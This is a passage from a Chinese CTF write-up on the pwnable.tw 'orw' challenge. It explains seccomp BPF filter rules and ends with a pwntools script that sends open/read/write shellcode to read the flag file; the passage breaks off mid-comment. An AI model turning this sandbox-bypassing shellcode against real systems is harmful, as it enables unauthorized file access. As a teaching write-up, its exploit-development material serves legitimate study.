Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。<br>将这几个参数带入到prctl：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<br><span class="hljs-comment">//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则</span><br><span class="hljs-comment">//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，</span><br></code></pre></td></tr></tbody></table></figure><p>其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2</span>, &amp;v1);<br><span class="hljs-comment">//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则</span><br><span class="hljs-comment">//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）</span><br></code></pre></td></tr></tbody></table></figure><p>上面v1所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v1所定义的规则：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">.rodata:<span class="hljs-number">08048640</span> <span class="hljs-number">20</span>                            unk_8048640 db  <span class="hljs-number">20</span>h                     ; DATA XREF: orw_seccomp+<span class="hljs-number">17</span>↑o<br>.rodata:<span class="hljs-number">08048641</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048642</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048643</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048644</span> <span class="hljs-number">04</span>                            db    <span class="hljs-number">4</span><br>.rodata:<span class="hljs-number">08048645</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048646</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048647</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048648</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048649</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>A <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864B</span> <span class="hljs-number">09</span>                            db    <span class="hljs-number">9</span><br>.rodata:<span class="hljs-number">0804864</span>C <span class="hljs-number">03</span>                            db    <span class="hljs-number">3</span><br>.rodata:<span class="hljs-number">0804864</span>D <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864</span>E <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804864F</span> <span class="hljs-number">40</span>                            db  <span class="hljs-number">40</span>h ; @<br>.rodata:<span class="hljs-number">08048650</span> <span class="hljs-number">20</span>                            db  <span class="hljs-number">20</span>h<br>.rodata:<span class="hljs-number">08048651</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048652</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048653</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048654</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048655</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048656</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048657</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">08048658</span> <span class="hljs-number">15</span>                            db  <span class="hljs-number">15</span>h<br>.rodata:<span class="hljs-number">08048659</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>A <span class="hljs-number">07</span>                            db    <span class="hljs-number">7</span><br>.rodata:<span class="hljs-number">0804865B</span> <span class="hljs-number">00</span>                            db    <span class="hljs-number">0</span><br>.rodata:<span class="hljs-number">0804865</span>C AD                            db <span class="hljs-number">0</span>ADh<br></code></pre></td></tr></tbody></table></figure><p>好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000ad</span>  <span class="hljs-keyword">if</span> (A == rt_sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000077</span>  <span class="hljs-keyword">if</span> (A == sigreturn) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000005</span>  <span class="hljs-keyword">if</span> (A == open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br>    <br></code></pre></td></tr></tbody></table></figure><blockquote><p>从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。<br>对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？</p></blockquote><h2 id="BPF-规则介绍"><a href="#BPF-规则介绍" class="headerlink" title="BPF-规则介绍"></a><strong>BPF 规则介绍</strong></h2><p>Q：BPF是数据链路层上的一种接口，它怎么会出现在系统调用中？</p><p>A：其实这原本是TCP协议包的过滤规则格式，后面被引用为沙箱规则。</p><hr><p>简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>&amp;prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> {</span><br>   <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>      len;    <span class="hljs-comment">/* Number of BPF instructions */</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <span class="hljs-comment">/* Pointer to array of BPF instructions */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>而filter域就指向了具体的规则，每一条规则有如下形式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> {</span>            <span class="hljs-comment">/* Filter block */</span><br>    __u16 code;                 <span class="hljs-comment">/* Actual filter code */</span><br>    __u8  jt;                   <span class="hljs-comment">/* Jump true */</span><br>    __u8  jf;                   <span class="hljs-comment">/* Jump false */</span><br>    __u32 k;                    <span class="hljs-comment">/* Generic multiuse field */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></tbody></table></figure><p>样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//首先指定操作的类别</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LD0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LDX0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ST0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_STX0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ALU0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JMP0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RET0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MISC    0x07</span><br><br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//在ld时指定操作数的大小</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_W0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_H0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_B0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//操作数类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IMM0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ABS0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_IND0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MEM0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LEN0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MSH0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//当操作码类型为ALU时，指定具体运算符</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_ADD0x00                    <span class="hljs-comment">//到底执行什么操作可以看filter.h里面的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_SUB0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MUL0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_DIV0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_OR0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_AND0x50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_LSH0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_RSH0x70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_NEG0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_MOD0x90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_XOR0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JA0x00                    <span class="hljs-comment">//当操作码类型是JMP时指定跳转类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JEQ0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGT0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JGE0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_K0x00                    <span class="hljs-comment">//常数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>BPF_X0x08</span><br></code></pre></td></tr></tbody></table></figure><p>另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> {</span><br>    <span class="hljs-type">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (在 &lt;linux/audit.h&gt; 里) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据</span><br><span class="hljs-comment">//或者</span><br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></td></tr></tbody></table></figure><p>而跳转语句写法如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)               <br><span class="hljs-comment">//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转</span><br></code></pre></td></tr></tbody></table></figure><p>其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。<br>最后当验证完成需要返回结果，即是否允许：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></td></tr></tbody></table></figure><p>过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。<br>总结一下：</p><ol><li><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP</li><li><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</li><li>BPF 条件判断跳转指令：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。</li><li><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</li></ol><p>例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> {<br>    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),          <span class="hljs-comment">// 从第0个字节位置开始，加载读取系统调用号</span><br>    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="hljs-number">257</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),       <span class="hljs-comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span><br>    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),         <span class="hljs-comment">// 比较系统调用号是否大于 0，是就跳到第6行</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="hljs-comment">// 拒绝系统调用，返回 0</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="hljs-comment">// 允许系统调用</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>拿本题的sock_filter结构体说明一下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br></code></pre></td></tr></tbody></table></figure><p>line 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。<br>line 8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。</p><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。<br>老规矩，检查一下文件的保护机制：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww<br>[*] <span class="hljs-string">'/mnt/hgfs/PWN\xe9\xa2\x98/Range/pwnable.xyz/orww'</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure><p>可以看到程序为32位，只开启了NX保护。main函数如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>很简单，输入shellcode之后程序就会执行它。<br>还有一个问题，system和execve都被禁用了怎么办？<br>读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。<br>同时题目已经给予了这个提示：</p><p>因此这里考验我们直接编写shellcode的能力，这里注意<br>• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。<br>• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。<br>由于这道题是32位程序，因此编写shellcode如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>context.log_level=<span class="hljs-string">"debug"</span><br>p = remote(<span class="hljs-string">'chall.pwnable.tw'</span>, <span class="hljs-number">10001</span>)<br><br>shellcode_open = <span class="hljs-string">'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'</span><br>shellcode_read = <span class="hljs-string">'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'</span><br>shellcode_write = <span class="hljs-string">'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'</span><br>shellcode = shellcode_open + shellcode_read + shellcode_write<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br>p.recvuntil(<span class="hljs-string">':'</span>)<br>p.sendline(shellcode)<br>print p.recv()<br>p.interactive()<br><br><span class="hljs-string">'''</span><br>shellcode说明：                   <br>xor eax,eax      ;清空需要用到的寄存器<br>xor ebx,ebx<br>xor ecx,ecx<br>xor edx,edx<br><br><span class="hljs-meta">#fd = open(<span class="hljs-string">'/home/orw/flag'</span>,0)</span><br>push <span class="hljs-number">0x00006761</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6c662f77</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x726f2f65</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>push <span class="hljs-number">0x6d6f682f</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>的十六进制<br>mov ebx, esp;              ;<span 